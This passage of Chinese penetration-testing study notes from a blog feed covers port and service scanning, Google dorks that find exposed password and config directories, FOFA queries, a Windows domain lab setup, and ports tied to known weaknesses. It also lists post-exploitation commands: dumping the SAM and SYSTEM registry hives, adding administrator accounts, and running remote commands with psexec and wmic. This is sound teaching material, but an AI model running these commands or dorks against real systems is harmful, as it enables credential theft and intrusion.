title="端口扫描"></a>端口扫描</h2><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p><h3 id="渗透端口"><a href="#渗透端口" class="headerlink" title="渗透端口"></a>渗透端口</h3><blockquote><p>21,22,23,1433,152,3306,3389,5432,5900,50070,50030,50000,27017,27018,11211,9200,9300,7001,7002,6379,5984,873,443,8000-9090,80-89,80,10000,8888,8649,8083,8080,8089,9090,7778,7001,7002,6082,5984,4440,3312,3311,3128,2601,2604,2222,2082,2083,389,88,512,513,514,1025,111,1521,445,135,139,53</p></blockquote><h3 id="masscan端口扫描"><a href="#masscan端口扫描" class="headerlink" title="masscan端口扫描"></a>masscan端口扫描</h3><p>masscan -p 1-65535 ip –rate=1000</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721110721941.png" alt="image-20210721110721941"></p><h3 id="御剑端口扫描工具"><a href="#御剑端口扫描工具" class="headerlink" title="御剑端口扫描工具"></a>御剑端口扫描工具</h3><p><img src="/2021/07/20/60-zhi-day16/image-20210721110918876.png" alt="image-20210721110918876"></p><h3 id="nmap端口扫描和探测端口信息"><a href="#nmap端口扫描和探测端口信息" class="headerlink" title="nmap端口扫描和探测端口信息"></a>nmap端口扫描和探测端口信息</h3><p>常用参数，如：</p><ul><li>nmap -sV 192.168.0.2</li><li>nmap -sT 92.168.0.2</li><li>nmap -Pn -A -sC 192.168.0.2</li><li>nmap -sU -sT -p0-65535 192.168.122.1</li></ul><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><p>nmap -iL ip.txt</p><p>来扫描列表中所有的ip。</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721111153716.png" alt="image-20210721111153716"></p><h3 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a>在线端口检测</h3><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721111250384.png" alt="image-20210721111250384"></p><h2 id="旁站和c段"><a href="#旁站和c段" class="headerlink" title="旁站和c段"></a>旁站和c段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p><p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p><h3 id="站长之家"><a href="#站长之家" class="headerlink" title="站长之家"></a>站长之家</h3><p>同ip网站查询<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721111718764.png" alt="image-20210721111718764"></p><p><a href="https://chapangzhan.com/">https://chapangzhan.com/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721111725776.png" alt="image-20210721111725776"></p><h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h3><p>Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。</p><p><strong>轻量级</strong>的搜索可以搜素出一些遗留后门，不想被发现的后台入口，<strong>中量级</strong>的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，<strong>重量级</strong>的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。</p><h4 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h4><ul><li>逻辑与：and</li><li>逻辑或： or </li><li>逻辑非： -</li><li>完整匹配：”关键词” </li><li>通配符：* ?</li></ul><h4 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h4><p><strong>intext:</strong></p><p>寻找正文中含有关键字的网页</p><p>例如： intext:后台登录  将只返回正文中包含 后台登录 的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721112102543.png" alt="image-20210721112102543"></p><p><strong>intitle:</strong></p><p>寻找标题中含有关键字的网页</p><p>例如： <strong>intitle:后台登录</strong>  将只返回标题中包含 后台登录 的网页，<strong>intitle:后台登录 密码</strong> 将返回标题中包含后台登陆而正文中包含密码的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721112718565.png" alt="image-20210721112718565"></p><p><strong>allintitle:</strong></p><p>用法和intitle类似，只不过可以指定多个词</p><p>例如： <strong>alltitle:后台登录 管理员</strong>  将返回标题中包含后台登录 和管理员的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721112748777.png" alt="image-20210721112748777"></p><p><strong>inurl：</strong></p><p>将返回url中含有关键词的网页</p><p>例如：<strong>inurl:Login</strong>  将返回url中含有 Login 的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721112706339.png" alt="image-20210721112706339"></p><p><strong>allinurl:</strong></p><p>用法和inurl类似，只不过可以指定多个词</p><p>例如：<strong>allinurl:Login admin</strong> 将返回url中含有 Login 和 admin 的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721112952968.png" alt="image-20210721112952968"></p><p><strong>site:</strong></p><p>指定访问的站点</p><p>例如： <strong>site:baidu.com inurl:Login</strong>  将只在baidu.com 中查找url中含有 Login的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721113025162.png" alt="image-20210721113025162"></p><p><strong>filetype:</strong></p><p>指定访问的文件类型</p><p>例如：<strong>site:baidu.com filetype:pdf</strong>   将只返回baidu.com站点上文件类型为pdf的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721113109611.png" alt="image-20210721113109611"></p><p><strong>link:</strong></p><p>指定链接的网页，例如：<strong>link:<a href="http://www.baidu.com/">www.baidu.com</a></strong>  将返回所有包含指向 <a href="http://www.baidu.com/">www.baidu.com</a> 的网页</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721113151312.png" alt="image-20210721113151312"></p><p><strong>related:</strong></p><p>相似类型的网页</p><p>例如：<strong>related:<a href="http://www.xjtu.edu.cn/">www.xjtu.edu.cn</a></strong> 将返回与 <a href="http://www.xjtu.edu.cn/">www.xjtu.edu.cn</a> 相似的页面，相似指的是网页的布局相似</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721113230486.png" alt="image-20210721113230486"></p><p>cache:</p><p>网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:<a href="http://www.hackingspirits.com/">www.hackingspirits.com</a>  guest  ，将返回指定网站的缓存，并且正文中含有guest</p><p>info:</p><p>返回站点的指定信息，例如：info:<a href="http://www.baidu.com/">www.baidu.com</a>   将返回百度的一些信息</p><p>define:</p><p>返回某个词语的定义，例如：define:Hacker　　将返回关于Hacker的定义</p><p>phonebook:</p><p>电话簿查询美国街道地址和电话号码信息。例如：phonebook:Lisa+CA  将返回名字里面包含Lisa并住在加州的人的所有名字</p><p>Index of<br>利用  Index of  语法去发现允许目录浏览的web网站，就像在本地的普通目录一样。下面是一些有趣的查询：</p><ul><li>index of /admin</li><li>index of /passwd</li><li>index of /password</li><li>index of /mail</li><li>“index of /“ +passwd</li><li>“index of /“ +password.txt</li><li>“index of /“ +.htaccess</li><li>“index of /root”</li><li>“index of /cgi-bin”</li><li>“index of /logs”</li><li>“index of /config”</li></ul><h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>如FOFA搜索旁站和C段</p><p>FOFA的常用语法</p><ul><li><p>同IP旁站：ip=”192.168.0.1”</p></li><li><p>C段：ip=”192.168.0.0/24”</p></li><li><p>子域名：domain=”baidu.com”</p></li><li><p>标题/关键字：title=”百度”</p></li><li><p>如果需要将结果缩小到某个城市的范围，那么可以拼接语句</p><p>title=”百度”&amp;&amp; region=”Beijing”</p></li><li><p>特征：body=”百度”或header=”baidu”</p></li></ul><p>该方法效率较高，并能够直观地看到站点标题，但也有不常见端口未收录的情况，虽然这种情况很少，但之后补充资产的时候可以用下面的方法nmap扫描再收集一遍。</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721113829476.png" alt="image-20210721113829476"></p><p><a href="https://www.shodan.io/dashboard?language=en">https://www.shodan.io/dashboard?language=en</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721113917500.png" alt="image-20210721113917500"></p><h3 id="在线c段查询"><a href="#在线c段查询" class="headerlink" title="在线c段查询"></a>在线c段查询</h3><p>webscan.cc</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721114446949.png" alt="image-20210721114446949"></p><p><a href="https://c.webscan.cc/">https://c.webscan.cc/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721114508555.png" alt="image-20210721114508555"></p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建域环境&amp;windows指令</title>
      <link href="/2021/07/20/60-zhi-day15-1/"/>
      <url>/2021/07/20/60-zhi-day15-1/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h1><span id="more"></span><h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><h3 id="什么是域？"><a href="#什么是域？" class="headerlink" title="什么是域？"></a>什么是域？</h3><blockquote><p>Windows域为网络管理员提供了一种方法来管理大量的pc机，并从一个地方控制它们。一个或多个服务器(称为域控制器)控制域及其上的计算机。</p><p>域通常由在同一本地网络上的计算机组成。但是，连接到某个域的计算机可以通过VPN或Internet连接继续与域控制器通信。这使得企业和学校能够远程管理他们提供给员工和学生的笔记本电脑。</p><p>当计算机连接到一个域时，它不会使用自己的本地用户帐户，用户帐户和密码都是在域控制器上统一管理。当您登录到该域中的计算机时，计算机将使用域控制器验证您的用户帐户名称和密码。这意味着您可以在任何连接到该域的计算机上使用相同的用户名和密码登录。</p><p>网络管理员可以更改“域控制器”上的组策略设置。域上的每台计算机将从“域控制器”获得这些设置，它们将覆盖用户在其pc上指定的任何本地设置。所有的设置都是从一个地方控制的。这也“锁定”了计算机。您可能不允许更改连接到域的计算机上的许多系统设置。</p></blockquote><h3 id="什么是域控？"><a href="#什么是域控？" class="headerlink" title="什么是域控？"></a>什么是域控？</h3><blockquote><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录的计算机称为域控制器。在第一次安装活动目录时,安装活动目录的那台计算机就成为域控制器,简称“域控”。域控制器存储着目录数据并管理用户域的交互关系,其中包括用户登录过程、身份验证和目录搜索等。</p><p>一个域可以有多个域控制器。为了获得高可用性和容错能力,规模较小的域只需两个域控制器,一个实际使用,另一个用于容错性检査;规模较大的域可以使用多个域控制器。</p></blockquote><h3 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h3><p>准备两台 windows 2012 家庭网络选择桥接 如果在学校 请选择nat模式</p><table><thead><tr><th align="left">域控 12-dc</th><th>192.168.0.120</th></tr></thead><tbody><tr><td align="left">域内机子 12-demo</td><td>192.168.0.117</td></tr></tbody></table><h4 id="更改俩台主机的名字"><a href="#更改俩台主机的名字" class="headerlink" title="更改俩台主机的名字"></a>更改俩台主机的名字</h4><p>12-dc </p><p>12-demo </p><h4 id="安装域控"><a href="#安装域控" class="headerlink" title="安装域控"></a>安装域控</h4><p>服务器管理 </p><p>管理 </p><p>添加角色和功能</p><p>域服务器</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720112108382.png" alt="image-20210720112108382"></p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720112145181.png" alt="image-20210720112145181"></p><p>升级为域控制器</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720112204045.png" alt="image-20210720112204045"></p><p>添加新林</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720112223780.png" alt="image-20210720112223780"></p><p>输入密码</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720112242470.png" alt="image-20210720112242470"></p><p>下一步即可 重启</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720112906346.png" alt="image-20210720112906346"></p><p>ad服务 和dns服务 都安装成功。</p><p>Dns服务是用来指定域名的ip </p><p>域内的主机 dns绑定 ad的ip 就能通过hacking.com访问 域控。</p><p><strong>在终端输入命令设置域管理的密码永远不要过期</strong></p><p>net accounts /maxpwage:unlimited</p><h3 id="建立域普通用户"><a href="#建立域普通用户" class="headerlink" title="建立域普通用户"></a>建立域普通用户</h3><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720113241152.png" alt="image-20210720113241152"></p><p>新建组织 xiaoshaK </p><p>在里面加入demo1 密码需符合策略</p><h3 id="将demo1加入域内"><a href="#将demo1加入域内" class="headerlink" title="将demo1加入域内"></a>将demo1加入域内</h3><p>把网卡的dns设置域控的ip 192.168.0.120 这样设置的目的让主机能够通过域名找到域控IP</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720113355081.png" alt="image-20210720113355081"></p><p>更改计算机名把hacking.com 输入到域</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720113419052.png" alt="image-20210720113419052"></p><p>然后输入域的普通用户即可加入域</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720113445187.png" alt="image-20210720113445187"></p><p>重启后用域用户密码登录</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720113535467.png" alt="image-20210720113535467"></p><p>查看当前域信息</p><p><img src="/2021/07/20/60-zhi-day15-1/image-20210720113642086.png" alt="image-20210720113642086"></p><h2 id="渗透中常用的windows指令"><a href="#渗透中常用的windows指令" class="headerlink" title="渗透中常用的windows指令"></a>渗透中常用的windows指令</h2><blockquote><p>ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名</p><p>net time /domain 查看域名、时间</p><p>net view /domain 查看域内所有共享</p><p>net view ip 查看对方局域网内开启了哪些共享</p><p>net config workstation 查看域名、机器名等</p><p>net user 用户名 密码 /add 建立用户</p><p>net user 用户名 /del #删除用户</p><p>net user guest /active:yes 激活guest账户</p><p>net user 查看账户</p><p>net user 账户名 查看指定账户信息</p><p>net user /domain 查看域内有哪些用户</p><p>Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。</p><p>net user 用户名 /domain 查看账户信息</p><p>net group /domain 查看域中的组</p><p>net group “domain admins” /domain 查看当前域的管理用户</p><p>query user 查看当前在线的用户</p><p>net localgroup 查看所有的本地组</p><p>net localgroup administrators 查看administrators组中有哪些用户</p><p>net localgroup administrators 用户名 /add 把用户添加到管理员组中</p><p>net start 查看开启服务</p><p>net start 服务名 开启某服务</p><p>net stop 服务名 停止某服务</p><p>net share 查看本地开启的共享</p><p>net share ipc$ 开启ipc$共享</p><p>net share ipc$ /del 删除ipc$共享</p><p>net share c$ /del 删除C：共享</p><p>\\192.168.0.108\c 访问默认共享c盘</p><p>dsquery server 查看所有域控制器</p><p>dsquery subnet 查看域内内子网</p><p>dsquery group 查看域内工作组</p><p>dsquery site 查看域内站点</p><p>netstat -a 查看开启了哪些端口,常用netstat -an</p><p>netstat -n 查看端口的网络连接情况，常用netstat -an</p><p>netstat -v 查看正在进行的工作</p><p>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）</p><p>netstat -s 查看正在使用的所有协议使用情况</p><p>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写</p><p>reg save hklm\sam sam.hive 导出用户组信息、权限配置</p><p>reg save hklm\system system.hive 导出SYSKEY</p><p>net use \目标IP\ipc$ 密码 /u:用户名 连接目标机器</p><p>at \目标IP 21:31 c:\server.exe 在某个时间启动某个应用</p><p>wmic /node:”目标IP” /password:”123456” /user:”admin” 连接目标机器</p><p>psexec.exe \目标IP -u username -p password -s cmd 在目标机器上执行cmd</p><p>finger username @host 查看最近有哪些用户登陆</p><p>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p><p>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。</p><p>arp -a 将显示出全部信息</p><p>nslookup IP地址侦测器</p><p>tasklist 查看当前进程</p><p>taskkill /pid PID数 终止指定PID进程</p><p>whoami 查看当前用户及权限</p><p>systeminfo 查看计算机信息（版本，位数，补丁情况）</p><p>ver 查看计算机操作系统版本</p><p>tasklist /svc 查看当前计算机进程情况</p><p>netstat -ano 查看当前计算机进程情况</p><p>wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建域环境 </tag>
            
            <tag> Windows指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编码&amp;端口</title>
      <link href="/2021/07/19/60-zhi-day15/"/>
      <url>/2021/07/19/60-zhi-day15/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h1><span id="more"></span><h2 id="渗透测试中的常用编码"><a href="#渗透测试中的常用编码" class="headerlink" title="渗透测试中的常用编码"></a>渗透测试中的常用编码</h2><h3 id="页面编码"><a href="#页面编码" class="headerlink" title="页面编码"></a>页面编码</h3><p>在网页设置网页编码 在&lt;head&gt;&lt;/head&gt;中加入设置特定html标签</p><p>&lt;meta charset=”utf-8” /&gt; 这样页面的编码就会变成utf-8 ，如果没有设置编码就会使用默认的编码，而浏览器默认编码与之不同就会出现乱码。</p><p>常用的有三种格式分别是 utf-8、gbk、gbk2312</p><h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><blockquote><p>ASCII 码使用指定的7位或8位二进制数组合来表示128或256种可能的字符。</p><p>标准ASCII 码也叫基础ASCII码，使用7位二进制数（剩下的1位二进制为0）来表示所有的大写和小写字母，数字0 到9、标点符号，以及在美式英语中使用的特殊控制字符。</p></blockquote><blockquote><p><strong>0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），</strong>如控制符：LF（换行）、CR（回车）、FF（换页）、DEL(删除)、BS（退格)、BEL（响铃）等；通信专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC">文本</a>显示有不同的影响  。</p><p>32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字。</p><p>65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。</p></blockquote><p><img src="/2021/07/19/60-zhi-day15/image-20210719132820246.png" alt="image-20210719132820246"></p><p>python下 ord与chr可以进行ASCII之间转换</p><p><img src="/2021/07/19/60-zhi-day15/image-20210719133051677.png" alt="image-20210719133051677"></p><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><blockquote><p>HTML编码的存在就是让他在代码中和显示中分开， 避免错误。</p><p>命名实体：构造是&amp;加上希腊字母，</p><p>字符编码：构造是&amp;#加十进制</p></blockquote><p><img src="/2021/07/19/60-zhi-day15/image-20210719133234488.png" alt="image-20210719133234488"></p><p>十六进制 ASCII码或unicode字符编码，浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染。</p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是一种多功能技术，可以通过它来战胜多种类型的输入过滤器。</p><p>URL编码的最基本表示方式是使用问题字符的十六进制ASCII编码来替换它们，并在ASCII编码前加%。</p><p>例如，单引号字符的ASCII码为0x27，其URL编码的表示方式为%27。</p><h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>javascript的十六进制编码:</p><pre class="line-numbers language-none"><code class="language-none">\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x21\x22\x29\x3B\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>javascript的八进制编码 :</p><pre class="line-numbers language-none"><code class="language-none">\74\163\143\162\151\160\164\76\141\154\145\162\164\50\42\110\145\154\154\157\40\167\157\162\154\144\41\42\51\73\74\57\163\143\162\151\160\164\76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="端口协议"><a href="#端口协议" class="headerlink" title="端口协议"></a>端口协议</h2><h3 id="端口的作用"><a href="#端口的作用" class="headerlink" title="端口的作用"></a>端口的作用</h3><p>一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。</p><h3 id="端口的类型"><a href="#端口的类型" class="headerlink" title="端口的类型"></a>端口的类型</h3><p>TCP端口和UDP端口。由于TCP和UDP两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。</p><ol><li><p>TCP端口</p><p>　　<strong>TCP端口，即传输控制协议端口</strong>，需要在客户端和服务器之间建立连接，这样可以提供<strong>可靠的数据传输</strong>。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</p></li><li><p>UDP端口</p><p>　　<strong>UDP端口，即用户数据包协议端口</strong>，无需在客户端和服务器之间建立连接，安全性得不到保障。常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口，QQ使用的8000和400</p></li></ol><h3 id="常见的端口"><a href="#常见的端口" class="headerlink" title="常见的端口"></a>常见的端口</h3><p>范围0-65535</p><ol><li><p>服务端使用的端口号</p><blockquote><p>预留端口号</p><p>取值范围0-1023,这些端口我们编程的时候不能使用，是那些vip应用程序使用的，只有超级用户特权的应用才允许被分配一个预留端口号</p></blockquote><blockquote><p>登记端口号</p><p>取值范围1024-49151，就是我们平时编写服务器使用的端口号范围</p></blockquote></li><li><p>客户端使用的端口号</p><p>取值范围49152-65535，这部分是客户端进程运行时动态选择的范围，又叫临时端口号</p></li></ol><h3 id="TCP协议三次握手"><a href="#TCP协议三次握手" class="headerlink" title="TCP协议三次握手"></a>TCP协议三次握手</h3><p><img src="/2021/07/19/60-zhi-day15/image-20210720105036595.png" alt="image-20210720105036595"></p><p>三次握手，是指建立TCP连接时，需要客户端和服务器总共发送三个包。</p><ul><li><p>第一次握手([SYN], Seq = x)</p><p>客户端发送一个SYN标记的包，Seq初始序列号x，发送完成后客户端进入SYN_SEND状态。</p></li><li><p>第二次握手([SYN,ACK], Seq = y, ACK = x + 1)</p><p>服务器返回确认包(ACK)应答，同时还要发送一个SYN包回去。ACK = x + 1,表示确认收到(客户端发来的Seq值 + 1)，Seq = y, 表示让客户端确认是否能收到。发送完成后服务端进入SYN_RCVD状态。</p></li><li><p>第三次握手([ACK], ACK = y + 1)</p><p>客户端再次发送确认包(ACK),ACK = y + 1, 表示确认收到服务器的包（服务端发来的Seq值 + 1）。客户端发送完毕后，进入ESTABLISHED状态，服务端接收到这个包，也进入ESTABLISHED状态, TCP握手结束</p></li></ul><h3 id="TCP状态转移要点"><a href="#TCP状态转移要点" class="headerlink" title="TCP状态转移要点"></a>TCP状态转移要点</h3><blockquote><p>  TCP协议规定，对于已经建立的连接，网络双方要进行四次握手才能成功断开连接，如果缺少了其中某个步骤，将会使连接处于假死状态，连接本身占用的资源不会被释放。网络服务器程序要同时管理大量连接，所以很有必要保证无用连接完全断开，否则大量僵死的连接会浪费许多服务器资源。在众多TCP状态中，最值得注意的状态有两个：CLOSE_WAIT和TIME_WAIT。 </p></blockquote><ol><li><p>LISTENING状态</p><p>FTP服务启动后首先处于侦听（LISTENING）状态。</p></li><li><p>ESTABLISHED状态</p><p>ESTABLISHED的意思是建立连接。表示两台机器正在通信。</p></li><li><p><strong>CLOSE_WAIT</strong></p><p><strong>对方主动关闭连接或者网络异常导致连接中断</strong>，这时我方的状态会变成CLOSE_WAIT 此时我方要调用close()来使得连接正确关闭</p></li><li><p><strong>TIME_WAIT</strong></p><p><strong>我方主动调用close()断开连接，收到对方确认后状态变为TIME_WAIT</strong>。TCP协议规定TIME_WAIT状态会一直持续2MSL(即两倍的分段最大生存期)，以此来确保旧的连接状态不会对新连接产生影响。<strong>处于TIME_WAIT状态的连接占用的资源不会被内核释放</strong>，所以作为服务器，在可能的情况下，尽量不要主动断开连接，以减少TIME_WAIT状态造成的资源浪费。</p></li></ol><h3 id="有关操作"><a href="#有关操作" class="headerlink" title="有关操作"></a>有关操作</h3><h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><p>netstat -ano</p><h4 id="查看端口是否被调用"><a href="#查看端口是否被调用" class="headerlink" title="查看端口是否被调用"></a>查看端口是否被调用</h4><p>netstat -ano|findstr “80”</p><h4 id="关于netstat"><a href="#关于netstat" class="headerlink" title="关于netstat"></a>关于netstat</h4><p>查看关于netstat的所有操作</p><p>netstat -h </p><p><img src="/2021/07/19/60-zhi-day15/image-20210720105725987.png" alt="image-20210720105725987"></p><h3 id="常见的端口-1"><a href="#常见的端口-1" class="headerlink" title="常见的端口"></a>常见的端口</h3><p>在渗透中端口扫描的收集主机那些服务很重要,这里收集到一些常见的的服务端口</p><h4 id="web类-web漏洞-敏感目录"><a href="#web类-web漏洞-敏感目录" class="headerlink" title="web类(web漏洞/敏感目录)"></a>web类(web漏洞/敏感目录)</h4><p>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p><p>80 web </p><p>80-89 web </p><p>8000-9090 web</p><h4 id="数据库类-扫描弱口令"><a href="#数据库类-扫描弱口令" class="headerlink" title="数据库类(扫描弱口令)"></a>数据库类(扫描弱口令)</h4><p>1433 MSSQL </p><p>1521 Oracle </p><p>3306 MySQL </p><p>5432 PostgreSQL </p><h4 id="特殊服务类-未授权-命令执行类-漏洞"><a href="#特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="特殊服务类(未授权/命令执行类/漏洞)"></a>特殊服务类(未授权/命令执行类/漏洞)</h4><p>443 SSL心脏滴血 </p><p>873 Rsync未授权 </p><p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p><p>6379 redis未授权 </p><p>7001,7002 WebLogic默认弱口令，反序列 </p><p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </p><p>11211 memcache未授权访问 </p><p>27017,27018 Mongodb未授权访问 </p><p>50000 SAP命令执行 </p><p>50070,50030 hadoop默认端口未授权访问</p><h4 id="常用端口类-扫描弱口令-端口爆破"><a href="#常用端口类-扫描弱口令-端口爆破" class="headerlink" title="常用端口类(扫描弱口令/端口爆破)"></a>常用端口类(扫描弱口令/端口爆破)</h4><p>21 ftp </p><p>22 SSH </p><p>23 Telnet </p><p>2601,2604 zebra路由，默认密码zebra</p><p>3389 远程桌面</p><h4 id="端口合计详情"><a href="#端口合计详情" class="headerlink" title="端口合计详情"></a>端口合计详情</h4><p>21 ftp</p><p>22 SSH </p><p>23 Telnet  </p><p>80 web  </p><p>80-89 web  </p><p>161 SNMP </p><p>389 LDAP </p><p>443 SSL心脏滴血以及一些web漏洞测试  </p><p>445 SMB </p><p>512,513,514 Rexec </p><p>873 Rsync未授权  </p><p>1025,111 NFS </p><p>1433 MSSQL </p><p>1521 Oracle:(iSqlPlus Port:5560,7778) </p><p>2082/2083 cpanel主机管理系统登陆 （国外用较多）</p><p>2222 DA虚拟主机管理系统登陆 （国外用较多） </p><p>2601,2604 zebra路由，默认密码zebra</p><p>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </p><p>3306 MySQL </p><p>3312/3311 kangle主机管理系统登陆  </p><p>3389 远程桌面 </p><p>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </p><p>5432 PostgreSQL </p><p>5900 vnc </p><p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p><p>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </p><p>6379 redis未授权 </p><p>7001,7002 WebLogic默认弱口令，反序列 </p><p>7778 Kloxo主机控制面板登录 </p><p>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </p><p>8080 tomcat/WDCP主机管理系统，默认弱口令 </p><p>8080,8089,9090 JBOSS </p><p>8083 Vestacp主机管理系统 （国外用较多） </p><p>8649 ganglia </p><p>8888 amh/LuManager 主机管理系统默认端口 </p><p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </p><p>10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </p><p>11211 memcache未授权访问 </p><p>27017,27018 Mongodb未授权访问 </p><p>28017 mongodb统计页面 </p><p>50000 SAP命令执行 </p><p>50070,50030 